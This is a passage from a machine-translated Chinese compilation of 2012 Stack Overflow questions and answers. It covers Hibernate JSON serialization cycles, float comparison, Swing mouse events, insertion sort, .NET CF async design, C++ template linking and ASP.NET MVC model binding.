        jsonObject1.put("name", nombre);
        jsonObject1.put("apellidos", apellidos);
        jsonObject1.put("dni", dni);
        jsonObject1.put("telefono", telefono);
        jsonObject1.put("email", email);
        jsonObject1.put("direccion", direccion);
        jsonObject1.put("numero",numero);
        jsonObject1.put("poblacion", poblacion);
        jsonObject1.put("cp", cp);
        jsonObject1.put("provincia", provincia);
        jsonObject1.put("login", login);
        jsonObject1.put("pass", contraseña);

        jsonObject1.put("rol", rol); 
```

运行应用程序时出现以下错误：

net.sf.json.JSONException：层次结构中有一个循环！在 net.sf.json.util.CycleDetectionStrategy$StrictCycleDetectionStrategy.handleRepeatedReferenceAsObject(CycleDetectionStrategy.java:97) 在 net.sf.json.JSONObject._fromBean(JSONObject.java:857) 在 net.sf.json.JSONObject.fromObject(JSONObject .java:192) 在 net.sf.json.JSONObject._processValue(JSONObject.java:2774) 在 net.sf.json.JSONObject._setInternal(JSONObject.java:2798) 在 net.sf.json.JSONObject.setValue( JSONObject.java:1507) 在 net.sf.json.JSONObject._fromBean(JSONObject.java:940) 在 net.sf.json.JSONObject.fromObject(JSONObject.java:192) 在 net.sf.json.JSONArray._processValue (JSONArray.java:2557) 在 net.sf.json.JSONArray.processValue(JSONArray.java:2588) 在 net.sf.json.JSONArray.addValue(JSONArray.java:2575) 在 net.sf.json.JSONArray。 **在 servlet.UsuarioServlet.doPost(UsuarioServlet.java:195)**

粗体错误行是上面粘贴的 servlet 代码中出现的最后一行。“jsonObject1.put('rol', rol);”

我究竟做错了什么？

谢谢！

编辑：

Rol类的代码如下：

```
package modelos; 
```

// 由 Hibernate Tools 3.4.0.CR1 于 19-abr-2012 18:48:54 生成

导入 java.util.HashSet；导入 java.util.Set；

/** * hbm2java 生成的 Rol */ public class Rol 实现 java.io.Serializable {

```
 private int idRol;
 private String nombre;
 private Boolean isAdmin;
 private Set<Usuario> usuarios = new HashSet<Usuario>(0);

public Rol() {
}

public Rol(int idRol) {
    this.idRol = idRol;
}
public Rol(int idRol, String nombre, Boolean isAdmin, Set<Usuario> usuarios) {
   this.idRol = idRol;
   this.nombre = nombre;
   this.isAdmin = isAdmin;
   this.usuarios = usuarios;
}

public int getIdRol() {
    return this.idRol;
}

public void setIdRol(int idRol) {
    this.idRol = idRol;
}
public String getNombre() {
    return this.nombre;
}

public void setNombre(String nombre) {
    this.nombre = nombre;
}
public Boolean getIsAdmin() {
    return this.isAdmin;
}

public void setIsAdmin(Boolean isAdmin) {
    this.isAdmin = isAdmin;
}
public Set<Usuario> getUsuarios() {
    return this.usuarios;
}

public void setUsuarios(Set<Usuario> usuarios) {
    this.usuarios = usuarios;
} 
```

}

该代码由 Hibenate 生成为 Usuario 代码。

xml如下：

```
<hibernate-mapping>
<class name="modelos.Rol" table="rol" catalog="mydb">
    <id name="idRol" type="int">
        <column name="idRol" />
        <generator class="assigned" />
    </id>
    <property name="nombre" type="string">
        <column name="Nombre" length="45" />
    </property>
    <property name="isAdmin" type="java.lang.Boolean">
        <column name="isAdmin" />
    </property>
    <set name="usuarios" table="usuario" inverse="true" lazy="false" fetch="select">
        <key>
            <column name="Rol_idRol" not-null="true" />
        </key>
        <one-to-many class="modelos.Usuario" />
    </set>
</class> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:48:23.127

在您粘贴的代码中，没有“Rol”类或表定义？

# iphone - 比较运算符无法正常工作 Xcode

> ID：11091520
> 
> 赞同：0
> 
> 时间：2012-06-18T21:41:50.347
> 
> 标签：iphone, ios, xcode, ipad

我正在为我的学生制作评分应用程序，但我的比较运算符没有按照我期望的方式运行。我的代码如下；

```
float FINAL = ((_gradeyouwant - (_quarter1 * 0.2f) - (_quarter2 * 0.2f) - (_quarter3 * 0.2f) - (_quarter4 * 0.2f) - (_quarterM * 0.1f)) / 0.1f);

NSLog(@"q1 = %.2f", _quarter1);
NSLog(@"q2 = %.2f", _quarter2);
NSLog(@"q3 = %.2f", _quarter3);
NSLog(@"q4 = %.2f", _quarter4);
NSLog(@"qM = %.2f", _quarterM);
NSLog(@"qF = %.2f", FINAL);
NSLog(@"grade = %.2f", _gradeyouwant);

if ((FINAL > 4.3f))
{
    [_result setText:[NSString stringWithFormat:@"It is not possible to get your desired grade."]];
}else if ((FINAL > 4.0f))
{
    [_result setText:[NSString stringWithFormat:@"You would need to get an A+"]];
}else if ((FINAL > 3.7f))
{
    [_result setText:[NSString stringWithFormat:@"You would need to get an A"]];
}else if ((FINAL > 3.3f))

ETC. ETC. 
```

当您使用 NSLog 查看输出时，它会告诉我所有内容的正确值。但是，如果我让它最终是 4.0，它不会打印正确的字符串。我在想当它到达 FINAL > 4.0 时，它不会运行那条线。但确实如此。我究竟做错了什么？提前非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:57:41.517

这就是花车的工作原理。谷歌它，例如[http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm](http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm)

系统可能无法精确存储 4.0。它更多地是您的 CPU 和数据类型选择的限制。使用范围可能非常有效。

我会使用 int 并模拟十进制数字，例如 GPA * 100。

# iphone - 设备方向到状态栏方向更改

> ID：11091521
> 
> 赞同：1
> 
> 时间：2012-06-18T21:41:51.030
> 
> 标签：iphone, ios, uideviceorientation, nsstatusbar

我创建了一个设备方向侦听器来捕获设备何时旋转，就像这样

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(jumpBarButtonPosition)
                                                 name:@"UIDeviceOrientationDidChangeNotification" object:nil]; 
```

但是在 jumpBarButtonPosition 方法中，我已从使用 UIDeviceOrientation 更改为 statusBarOrientation，因此我正在考虑可以替换**UIDeviceOrientationDidChangeNotification**的内容，以便仅接收有关 statudBarOrientation 更改的通知。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:47:40.657

不要将其键入为字符串：@"UIDeviceOrientationDidChangeNotification" 使用：

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(jumpBarButtonPosition)
                                             name:UIDeviceOrientationDidChangeNotification object:nil]; 
```

# java - PhoneGap 中的延时摄影应用

> ID：11091522
> 
> 赞同：-1
> 
> 时间：2012-06-18T21:41:53.923
> 
> 标签：java, javascript, android, cordova

我有一个简单的问题。例如，是否有可能制作一个每 5 秒拍摄一张照片的简单应用程序？

capture.captureImage
camera.getPicture

使用标准 Android 相机应用拍照

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T00:07:24.207

不，不是使用您需要编写插件的标准 API。Camera.getPicture 和 Capture.captureImage 命令需要用户交互。

# sql - 如何为中位数创建聚合函数？

> ID：11091525
> 
> 赞同：1
> 
> 时间：2012-06-18T21:42:14.703
> 
> 标签：sql, math, advantage-database-server, median

我需要在 Advantage-Database 中创建一个聚合函数来计算中值。

```
SELECT 
    group_field
  , MEDIAN(value_field) 
FROM 
  table_name
GROUP BY 
  group_field 
```

似乎我找到的解决方案非常特定于所使用的 sql 引擎。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T11:47:00.063

如您在帮助文件中所见，ADS 中没有内置的中值聚合函数：

[http://devzone.advantagedatabase.com/dz/webhelp/Advantage10.1/index.html](http://devzone.advantagedatabase.com/dz/webhelp/Advantage10.1/index.html)

恐怕您必须编写自己的存储过程或sql脚本来解决这个问题。

以下问题的公认答案可能是您的解决方案： [Simple way to calculate median with MySQL](https://stackoverflow.com/questions/1291152/simple-way-to-calculate-median-with-mysql)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-16T18:42:36.767

我已经用一个解决方案更新了这个答案，该解决方案避免了加入，有利于将一些数据存储在 json 对象中。

解决方案＃1（两个选择和一个加入，一个获得计数，一个获得排名）

这有点冗长，但它确实有效，而且速度相当快。

```
SELECT  x.group_field, 
        avg(
            if( 
                x.rank - y.vol/2 BETWEEN 0 AND 1, 
                value_field, 
                null
            )
        ) as median
FROM (
    SELECT  group_field, value_field, 
            @r:= IF(@current=group_field, @r+1, 1) as rank, 
            @current:=group_field
    FROM (
        SELECT group_field, value_field
        FROM table_name
        ORDER BY group_field, value_field
    ) z, (SELECT @r:=0, @current:='') v
) x, (
    SELECT group_field, count(*) as vol 
    FROM table_name
    GROUP BY group_field
) y WHERE x.group_field = y.group_field
GROUP BY x.group_field 
```

解决方案 #2（使用 json 对象来存储计数并避免连接）

```
SELECT group_field, 
    avg(
        if(
            rank - json_extract(@vols, path)/2 BETWEEN 0 AND 1,
            value_field,
            null
        )
    ) as median
FROM (
    SELECT group_field, value_field, path, 
        @rnk := if(@curr = group_field, @rnk+1, 1) as rank,
        @vols := json_set(
            @vols, 
            path, 
            coalesce(json_extract(@vols, path), 0) + 1
        ) as vols,
        @curr := group_field
    FROM (
        SELECT p.group_field, p.value_field, concat('$.', p.group_field) as path
        FROM table_name
        JOIN (SELECT @curr:='', @rnk:=1, @vols:=json_object()) v
        ORDER BY group_field, value_field DESC
    ) z
) y GROUP BY group_field; 
```

# java - 摆动鼠标监听器被子组件拦截

> ID：11091531
> 
> 赞同：6
> 
> 时间：2012-06-18T21:42:39.617
> 
> 标签：java, swing, mouseevent

我有一个摆动组件，它有几个子组件。如果鼠标位于这些组件中的任何一个上，我想要更改一些标签，然后如果鼠标移出所有组件，则将其更改为其他标签。我正在尝试找到一种更有效的方法来做到这一点。

目前，我在所有看起来像这样的子组件上都有鼠标侦听器：

```
class AMouseListener extends MouseAdapter {
    private boolean mouseOver;
    mouseEntered(MouseEvent e) { mouseOver = true; updateLabel(); }
    mouseExited(MouseEvent e) { mouseOver = false; updateLabel(); }

    void updateLabel() {
       String text = "not-over-any-components";
       // listeners are each of the listeners added to the child components
       for ( AMouseListener listener :listeners ) {
          if ( listener.mouseOver ) {
             text = "over-a-component";
             break;
          }
       }
    }
} 
```

这可行，但我觉得应该有更好的方法来处理这个问题，只处理父容器上的 mouseEntered 和 mouseExited 事件，但由于子组件拦截这些事件，我不知道如何去做（我不一定可以控制子组件，因此如果我愿意，我无法将鼠标事件转发给父事件）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-18T22:22:35.623

例如

![在此处输入图像描述](../Images/731992e7e8f95f2df295be944216cd37.png)

![在此处输入图像描述](../Images/e733c0aed635d945818e9c9248046d40.png)

```
import java.awt.Component;
import java.awt.Dimension;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import javax.swing.*;

public class TestMouseListener {

    public static void main(String[] args) {
        final JComboBox combo = new JComboBox();
        combo.setEditable(true);
        for (int i = 0; i < 10; i++) {
            combo.addItem(i);
        }
        final JLabel tip = new JLabel();
        tip.setPreferredSize(new Dimension(300, 20));
        JPanel panel = new JPanel();
        panel.add(combo);
        panel.add(tip);
        JFrame frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.add(panel);
        frame.pack();
        frame.setVisible(true);
        panel.addMouseListener(new MouseAdapter() {

            @Override
            public void mouseEntered(MouseEvent e) {
                tip.setText("Outside combobox");
            }

            @Override
            public void mouseExited(MouseEvent e) {
                Component c = SwingUtilities.getDeepestComponentAt(
                   e.getComponent(), e.getX(), e.getY());
                // doesn't work if you move your mouse into the combobox popup
                tip.setText(c != null && SwingUtilities.isDescendingFrom(
                   c, combo) ? "Inside combo box" : "Outside combobox");
            }
        });
    }

    private TestMouseListener() {
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T21:54:51.417

查看“玻璃窗格”的文档和示例。
这应该给你你需要[的东西：玻璃窗格](http://docs.oracle.com/javase/tutorial/uiswing/components/rootpane.html#glasspane)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T22:05:54.390

您可以启动侦听器的单个实例并将该实例添加到每个组件。像这样：

```
AMouseListener aMouseListener=new  AMouseListener();

for each(Component c:components) {
caddMouseListener(aMouseListener);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-08-08T16:58:12.713

我知道这已经很老了，但这是一个简单的解决方案，您可以使用它为组件及其边界内的所有组件创建鼠标侦听器（无需单独将侦听器添加到所有组件）：

```
/**
 * Creates an {@link AWTEventListener} that will call the given listener if
 * the {@link MouseEvent} occurred inside the given component, one of its
 * children or the children's children etc. (recursive).
 * 
 * @param component
 *            the component the {@link MouseEvent} has to occur inside
 * @param listener
 *            the listener to be called if that is the case
 */
public static void addRecursiveMouseListener(final Component component, final MouseListener listener) {
    Toolkit.getDefaultToolkit().addAWTEventListener(new AWTEventListener() {

        @Override
        public void eventDispatched(AWTEvent event) {
            if(event instanceof MouseEvent) {
                MouseEvent mouseEvent = (MouseEvent) event;
                if(mouseEvent.getComponent().isShowing() && component.isShowing()){
                    if (containsScreenLocation(component, mouseEvent.getLocationOnScreen())) {
                        if(event.getID() == MouseEvent.MOUSE_PRESSED) {
                            listener.mousePressed(mouseEvent);
                        }
                        if(event.getID() == MouseEvent.MOUSE_RELEASED) {
                            listener.mouseReleased(mouseEvent);
                        }
                        if(event.getID() == MouseEvent.MOUSE_ENTERED) {
                            listener.mouseEntered(mouseEvent);
                        }
                        if(event.getID() == MouseEvent.MOUSE_EXITED) {
                            listener.mouseExited(mouseEvent);
                        }
                        if(event.getID() == MouseEvent.MOUSE_CLICKED){
                            listener.mouseClicked(mouseEvent);
                        }
                    }
                }
            }
        }
    }, AWTEvent.MOUSE_EVENT_MASK);
}

/**
 * Checks if the given location (relative to the screen) is inside the given component
 * @param component the component to check with
 * @param screenLocation the location, relative to the screen
 * @return true if it is inside the component, false otherwise
 */
public static boolean containsScreenLocation(Component component, Point screenLocation){
    Point compLocation = component.getLocationOnScreen();
    Dimension compSize = component.getSize();
    int relativeX = screenLocation.x - compLocation.x;
    int relativeY = screenLocation.y - compLocation.y;
    return (relativeX >= 0 && relativeX < compSize.width && relativeY >= 0 && relativeY < compSize.height);
} 
```

**注意：**一旦鼠标退出此侦听器的根组件，`mouseExited(mouseEvent)`可能不会触发，但是您可以将鼠标侦听器添加到根组件本身，它应该会触发。
*`mouseExited(mouseEvent)`虽然一般来说是不可靠的。*

# java - 插入排序排序一个 ArrayList 问题

> ID：11091537
> 
> 赞同：3
> 
> 时间：2012-06-18T21:43:09.037
> 
> 标签：java, arraylist, while-loop, insertion-sort

现在我已经有一段时间了，我遇到了一个错误。现在我正在制作的程序是一个地址簿，我正在使用插入排序来对我称之为书籍（地址条目）的对象数组列表进行排序。现在我很快发现我的分拣机没有正确分拣，所以我做了一个简单的程序来测试分拣机，但它又不能正常工作。我想知道你们是否可以看看它并帮助我。

这是我的分拣机：

```
import java.util.ArrayList;
public class Sorts {

    /**
     * Sorts and array of integer from low to high
     * pre: none
     * post: Integers has been sorted from low to high
     */
    public static void insertionSort(ArrayList<String> test) {
        Comparable temp;
        int previousIndex;
        ArrayList<String> objectSort = test;

        for (int i = 1; i < objectSort.size(); i++) {
            temp = objectSort.get(i);
            previousIndex = i - 1;

            while ((objectSort.get(previousIndex).compareTo((String) temp)) == 1 && (previousIndex > 0)) {
                objectSort.set(previousIndex + 1, objectSort.get(previousIndex));
                previousIndex -= 1; //decrease index to compare current item with next previous item
            }
            if (objectSort.get(previousIndex).compareTo((String) temp) == 1) {
                /* shift item in first element up into next element */
                objectSort.set(previousIndex + 1, objectSort.get(previousIndex));
                /* place current item at index 0 (first element */
                objectSort.set(previousIndex, (String) temp);
            } else {
                /* place current item at index ahead of previous item */
                objectSort.set(previousIndex + 1, (String) temp);
            }

        }
    }
} 
```

我测试它的简单程序是：

```
import java.util.ArrayList;

public class Main {
    public static void main(String[] args){
        ArrayList<String> test = new ArrayList<String>();

        test.add("Roxy");
        test.add("Proxy");
        test.add("Moxy");
        test.add("Samuel Adams");

        Sorts.insertionSort(test);

        System.out.println(test);

    }

} 
```

总而言之，我的 ArrayList 分拣器有问题。问题是它不会正确排序，我不知道为什么。非常感谢你。如果您有任何问题随时问。:)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-18T21:49:36.190

第一个问题：你期望`compareTo`总是返回 1 来表示“大于”。它只返回一个*大于 0*的值，该值可能是不同的正整数。所以你的`== 1`比较应该是`> 0`.

可能还有*其他*问题，但这是我要考虑的第一个问题。

# .net - .NET CF 3.5 Forms 与仅同步网络设备对话

> ID：11091538
> 
> 赞同：2
> 
> 时间：2012-06-18T21:43:13.297
> 
> 标签：.net, winforms, multithreading, asynchronous, compact-framework

好吧，是时候在这里问我的第一个问题了……

我为它们创建了许多视图（CF 3.5 用户控件，使用 OpenNETCF.IoC 和 resco 控件）和导航控制器。

我还为一个非常奇怪的专有网络设备创建了一个抽象层（“驱动程序”）。命令只能在设备上同步执行，但我使用读取器线程来侦听来自设备的消息（可能随时出现，或响应同步命令）。这些消息可以在事件中分派或排队。

有点像这样，在“驱动程序”界面中：

`public Response ExecuteCommand(Command command);`<= 这是同步调用。有些命令可能会运行几分钟。

`public event DeviceMessageReceivedEvent;`<= 如果订阅了这个，传入的消息不是对上述方法的调用的直接回复，将在事件 args 中调度。这将从阅读器线程中调用。

`public Queue DeviceMessages;`<= 如果未订阅该事件，则此类消息位于此处。

还有一个便利的应用程序外观，但它基本上只是 ExecuteCommand 调用的精美包装器，所以我将在此处省略它。

问题：

我如何最好地将在事件和/或队列中接收到的数据连接到视图，以及如何最好地在 ExecuteCommand 方法上实现异步包装器 - 重申一下，由于设备网络的限制，它必须同步运行协议（是的，这真的很糟糕。）

在阅读了相当多的 .NET CF 3.5 WinForms 异步编程之后，我不知道如何继续。在第一个演示中，我经常使用 DataBindings，但这导致了在需要时没有明显的方法来使用 Control.Invoke 的问题。我还通过仅与 UI 线程同步执行所有命令并使用匿名线程而不是使用事件轮询队列上的消息来解决异步执行问题。由于显而易见的原因，我非常想改变这一点。

CF 不提供 BeginInvoke 和 EndInvoke，但我想这些会很简单，可以重新实现吗？

我应该创建一个以视图为中心的静态模型吗？这甚至会简化问题吗？

我应该创建一个额外的“中间”线程来处理模型/视图和驱动程序之间的状态传输吗？这甚至会简化问题吗？

...？

我想我在这里寻找一些关于一般设计原则的头脑风暴。我从来都不是一个 UI 人，主要是在做系统编程，从来没有比我能避免的更多的 .NET。异步编程的概念很清楚，只是不知道如何在这种情况下应用它们。

所以..任何意见表示赞赏，还有书籍推荐等......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:20:58.247

听起来很像我目前正在做的一个项目。我有硬件，一次只能发送一个命令。这些命令可能会超时，或者可能只是等到接收器唤醒。命令以回复或未经请求的数据消息的形式出现。

我所做的实际上是创建了一些图层，其中包含一些我现在正在编造的名称

**最低层 - 通信总线：**

*   知道如何发送和接收。
*   知道如何将传入的数据解析为“帧”，但仅此而已（它知道分隔符和校验和）。这实际上是在 OpenNETCF.IO 串行库中的一个缓冲线程中完成的。
*   将解析的帧放入队列以最小化接收器线程繁忙状态
*   有一个工作线程来监视 Rx 队列并分派帧
*   公开一个简单的“发送”接口（发送在上层处理）

**下一层 - API (?) 层**

设备监视器

*   知道存在哪些终端设备
*   知道我上次收到他们的消息是什么时候
*   从通信总线接收帧并将它们放入队列中（以免阻塞接收器）
*   知道如何更好地解析帧
*   引发特定于消息的事件
*   当节点上线时发送消息（从消息处理程序中检索）
*   有两个工作线程：
    *   TxThread 通过从 que 消息处理程序中提取来处理“一个且只有一个传出消息”问题
    *   RxThread 接收 watch 传入的帧队列，解析和分发这些消息

消息管理器

*   知道哪些消息需要发送到哪些设备
*   了解每条消息的状态（未发送、等待响应、超时等）
*   允许过滤“发送”、“超时”等项目

**服务层**

*   消费和抽象 API 层
*   向应用程序公开对象和事件（直接和通过 REST）
*   是否进行数据聚合（平均值、电池监控等）
*   包含业务规则/逻辑

这里的重点是我没有明确实现任何异步 API，尽管库中的几乎所有内容在行为上都是异步的。UI 只是为传入的内容查找事件（INotifyPropertyChanged 比比皆是）。对于传出，它会执行类似“请求将引脚 1 设置为高电平”的操作，这是非阻塞的。服务层进行一些检查以验证远程端实际发生的操作，但 UI 只是查看“pin state”属性，当它实际变为高电平时（如在服务层中验证的那样），它会更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:29:34.863

我最终得到了一堆特定的 IAsyncResult Begin/End 调用和其他有趣的东西，导致解决方案不是很漂亮或不太适合单核单管道 CPU。但从那以后，我在一个新项目中重新审视了这个问题。在这里，我创建了一个简单的包装器，它允许我轻松地触发和忘记 CF 中的异步调用。它可能并不完美，但它在我需要它做的事情上做得很好。

请注意，这仅适用于 UI 内容。

新架构现在包括一个通用连接层（通过公共接口的串行和 tcp）、一个特定于设备的 API 层（在此级别上几乎没有共同点的几个设备）、一个特定于设备的表示控制器、一个通用表示模型（tuns一旦抽象出来，它们实际上有很多共同点），最重要的是视图，它由表示控制器通过表示模型间接控制。视图对于所有设备（设备特定功能）并不完全相同，但呈现控制器控制视图中可见/加载的内容。

但事不宜迟，

调用示例：

```
 AsyncCallback callback = delegate(IAsyncResult result)
                                     {
                                         IView2MainContainer.StopWaiting();
                                         try
                                         {
                                             AsyncHelper.EndInvoke(result);
                                         }
                                         catch (Exception ex)
                                         {
                                             RescoMessageBoxHelper.ShowOK(
                                                 string.Format(StringResources.Message_FirmwareUpdateError,
                                                               ex.Message), MessageBoxIcon.Hand);
                                             return;
                                         }
                                         RescoMessageBoxHelper.ShowOK(StringResources.Message_FirmwareUpdateComplete, MessageBoxIcon.Asterisk);
                                     };

        AsyncHelper.BeginInvoke(
            callback,
            delegate
                {
                    IView2MainContainer.StartWaiting(StringResources.Message_WaitFirmwareUpdate);
                    presenterModel.CurrentDevice.UpdatePrinterFirmware(firmwareDataBuffer);
                }
            ); 
```

实施：

```
using System; 
using System.Collections.Generic;
using System.Threading;

namespace Allen.IView2.Common
{
  public static class AsyncHelper
  {
    private static readonly object resultsLock = new object();
    private static volatile List<AsyncResultImpl> results = new List<AsyncResultImpl>();

    public static void EndInvoke(IAsyncResult result)
    {
        if (!(result is AsyncResultImpl))
            throw new InvalidOperationException("The async result was of an unknown type.");

        lock (resultsLock)
        {
            if (!results.Contains((AsyncResultImpl) result))
            {
                throw new InvalidOperationException("The async result was unknown");
            }
            results.Remove((AsyncResultImpl) result);
        }
        ((AsyncResultImpl) result).AsyncWaitHandle.WaitOne();

        Exception ex = ((AsyncResultImpl) result).Exception;
        ((AsyncResultImpl) result).Dispose();

        if (ex != null)
        {
            throw ex;
        }
    }

    public static void BeginInvoke(AsyncCallback callback, Action action)
    {
        var result = new AsyncResultImpl(callback, null);

        lock (resultsLock)
        {
            results.Add(result);
        }

        ThreadPool.QueueUserWorkItem(delegate
                                         {
                                             try
                                             {
                                                 action.Invoke();
                                             }
                                             catch (Exception ex)
                                             {
                                                 result.Complete(ex);
                                                 return;
                                             }
                                             result.Complete();
                                         });
    }
}
} 
```

* * *

```
using System;
using System.Threading;

namespace Allen.IView2.Common
{
  public class AsyncResultImpl : IAsyncResult, IDisposable
  {
    private AsyncCallback callback;
    private Exception exception;
    private object state;
    private ManualResetEvent waitHandle;

    public AsyncResultImpl(AsyncCallback callback, object state)
    {
        this.callback = callback;
        this.state = state;
        waitHandle = new ManualResetEvent(false);
    }

    public ManualResetEvent AsyncWaitHandle
    {
        get { return waitHandle; }
    }

    public Exception Exception
    {
        get { return exception; }
    }

    public object AsyncState
    {
        get { return state; }
    }

    WaitHandle IAsyncResult.AsyncWaitHandle
    {
        get { return AsyncWaitHandle; }
    }

    public bool CompletedSynchronously
    {
        get { return false; }
    }

    public bool IsCompleted
    {
        get { return waitHandle.WaitOne(0, false); }
    }

    public void Dispose() // lazy dispose
    {
        if (null != waitHandle)
        {
            waitHandle.Close();
            waitHandle = null;
            state = null;
            callback = null;
        }
    }

    public void Complete()
    {
        Complete(null);
    }

    public void Complete(Exception exception)
    {
        this.exception = exception;
        waitHandle.Set();
        if (null != callback)
            if (callback.GetInvocationList().Length > 1)
                throw new InvalidOperationException("A callback must not be multicast.");
        if (null != callback)
        {
            try
            {
                callback(this);
            }
            catch
            {
// nom nom
            }
        }
    }
}
} 
```

# c++ - 未解析的外部符号“public: __thiscall Vector [...]”

> ID：11091540
> 
> 赞同：0
> 
> 时间：2012-06-18T21:43:28.840
> 
> 标签：c++, visual-c++, linker

因此，我创建了一个基本的 VC++ 程序，并创建了一个具有 1 个方法的模板类（除了构造函数和析构函数）。我收到以下错误：

```
>main.obj : error LNK2019: unresolved external symbol "public: __thiscall Vector<int>::~Vector<int>(void)" (??1?$Vector@H@@QAE@XZ) referenced in function _main
>main.obj : error LNK2019: unresolved external symbol "public: __thiscall Vector<int>::Vector<int>(int)" (??0?$Vector@H@@QAE@H@Z) referenced in function _main
>c:\users\edy\documents\visual studio 2010\Projects\ex01\Debug\ex01.exe : fatal error LNK1120: 2 unresolved externals 
```

这是我的代码：

（CPP 类文件）

```
using namespace std;
#include "Vector.h"
template <class T> Vector<T>::Vector(int n)
{
    this.crt = 0;
    this.dim = n;
    this.elem = new T[100];
}

template <class T> void Vector<T>::add(T e)
{
    this.elem[crt] = e;
    this.crt++;
}

template <class T> Vector<T>::~Vector(void)
{
    this.crt = 0;
} 
```

（H 类文件）

```
#pragma once
template <class T> class Vector
{
    public:
        int dim;
        T* elem;

        Vector(int n);
        void add(T e);
        ~Vector(void);

    private:
        int crt;
}; 
```

（主文件）

```
using namespace std;
#include "Vector.h"

int main(void)
{
    Vector<int> x(5);
    //x.add(1);    <--- if i decomment this line, it throws an additional error
    return 0;
} 
```

大多数解决方案都涉及未实现的方法，但我已经实现了所有方法。我不知道可能出了什么问题。有什么帮助吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T21:46:04.233

模板类实现需要对所有使用它们的翻译单元可见。将实现移动到头文件。

在你问之前 - 不，没有办法隐藏它们，除非你事先知道你的课程有哪些专业。如果你希望你`Vector`是通用的，那么实现需要是可见的。

如果您想将它们分开，通常的方法是将实现放在`.impl`包含在标题中的文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:48:02.967

如果您打算在`.cpp`文件中实现模板，则还需要在其中提供模板的显式实例化。您可以添加到模板的`.cpp`文件中：

```
class template Vector<int>; 
```

在底部。这将实例化`int`您的矢量模板的一个版本。但是，如果您遵循 Luchian 的建议，您会发现您的模板更易于使用。`Vector<>`如果您按照他的建议进行操作，编译器将在您在不同类型上使用时按需为您创建实例化。如果将其保留在`.cpp`文件中，则每次要创建不同类型的`Vector<>`.

有些人认为显式实例化比隐式实例“更精简”，因为如果不同的目标文件集多次使用相同的模板实例化，编译器可能会创建同样多的实例化。但是，当可执行文件链接在一起时，链接器最终会删除重复的实例化。即便如此，如果多个共享库以相同的参数重用相同的模板，即使动态链接器会清理它，膨胀仍然存在。如果可执行文件加载时间很重要，这可能是首选显式实例化的原因。如果您有一个非常大的项目，并且构建和链接时间是一个问题，这也可能是更喜欢显式实例化的原因。

否则，您应该坚持使用隐式实例化。

# c# - 尝试更新时模型对象不完整

> ID：11091542
> 
> 赞同：5
> 
> 时间：2012-06-18T21:44:33.033
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3

我有以下操作方法：

```
public ActionResult ProfileSettings()
        {
            Context con = new Context();
            ProfileSettingsViewModel model = new ProfileSettingsViewModel();
            model.Cities = con.Cities.ToList();
            model.Countries = con.Countries.ToList();
            model.UserProfile = con.Users.Find(Membership.GetUser().ProviderUserKey);
            return View(model); // Here model is full with all needed data
        }

        [HttpPost]
        public ActionResult ProfileSettings(ProfileSettingsViewModel model)
        {
            // Passed model is not good
            Context con = new Context();

            con.Entry(model.UserProfile).State = EntityState.Modified;
            con.SaveChanges();

            return RedirectToAction("Index", "Home");
        }

@using (Html.BeginForm("ProfileSettings", "User", FormMethod.Post, new { id = "submitProfile" }))
        {
            <li>
                <label>
                    First Name</label>
                @Html.TextBoxFor(a => a.UserProfile.FirstName)
            </li>
            <li>
                <label>
                    Last Name</label>
                @Html.TextBoxFor(a => a.UserProfile.LastName)
            </li>
...
<input type="submit" value="Save" />
... 
```

当我在 POST 方法中点击提交时收到的模型不完整。它包含 FirstName、LastName 等。但 UserID 为空。所以我不能更新对象。我在这里做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:53:40.390

MVC 仅根据请求中的内容重建您的模型。在您的特定情况下，您只提交 FirstName 和 LastName，因为这些是`@Html.TextBoxFor()`您的视图中包含的唯一调用。MVC 模型的行为不像`ViewState`，它没有存储在任何地方。

您也不想在视图模型中包含整个实体。如果您只需要 ID，那么这应该就是您所包含的所有内容。然后，您将再次从 DAL 加载您的实体，更新需要更改的属性，然后保存您的更改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:52:24.140

您应该将 UserId 存储为表单中的隐藏字段。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T22:23:35.253

在您的视图中添加一个 html 标签 HiddenFor，并确保您在 Get 操作中填充了 UserId：

```
@using (Html.BeginForm("ProfileSettings", "User", FormMethod.Post, new { id = "submitProfile" }))
        {

@Html.HiddenFor(a => a.UserProfile.UserId)
// your code here..

} 
```

# c# - 由于缺少文件，Visual Studio 2010 错误构建

> ID：11091544
> 
> 赞同：8
> 
> 时间：2012-06-18T21:44:43.393
> 
> 标签：c#, winforms, visual-studio-2010

我到处搜索，似乎找不到任何有同样问题的人（尽管我确信人们过去犯过同样的错误）......我不小心删除了我的 Debug 和 Release 文件夹的内容。现在我收到文件未找到错误。作为背景，它是 C# 中的 Windows 窗体应用程序，我正在运行 Visual Studio 10。

这是错误：

```
Unable to read manifest 'bin\Debug\projectName.vshost.exe.manifest' 
Could not find file [pathName]\projectName.vshost.exe.manifest. 
```

